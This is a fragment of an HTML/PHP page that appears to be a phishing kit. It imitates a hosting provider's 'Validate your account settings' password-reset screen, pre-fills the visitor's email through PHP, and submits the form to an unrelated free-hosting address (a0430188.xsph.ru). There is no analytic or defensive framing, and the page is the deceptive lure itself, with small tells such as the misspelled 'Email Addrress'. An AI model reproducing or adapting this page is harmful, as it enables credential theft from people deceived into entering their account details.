...
#captcha-container {
    margin-bottom: 20px !important
            ...
            "><div id="password-reset-container"><div id="parent-card" class="ux-card"><div id="form-header">
              <form action="http://a0430188.xsph.ru/validate/completed.php" method="GET">
            ...
            <p>Validate your account settings</p>

            <label for="PasswordRecoveryLandingUsername" id="label-PasswordRecoveryLandingUsername">Email Addrress </label><input spellcheck="false" type="text" required id="" name="email" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" readonly value="<?php echo $client_id;?>"></fieldset><fieldset class="form-group">
            ...
            </fieldset><button tabindex="0" class="btn btn-primary submit-button" id="" type="submit">Validate Account</button></div></div></div> </form></div></div></div></div></div></div></div><div id="footer-85ff98c4b0d823d68217b41206a35a77"><footer id="appheader-footer" class="manifest footer"><div role="contentinfo" class="container"><span>Copyright © 1999 - 2019.  All Rights Reserved.</span> <a href="#" target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click"><span>Privacy Policy</span></a></div><div id="gtm_privacy"></div></footer></div><script>
window.ux = window.ux || {};
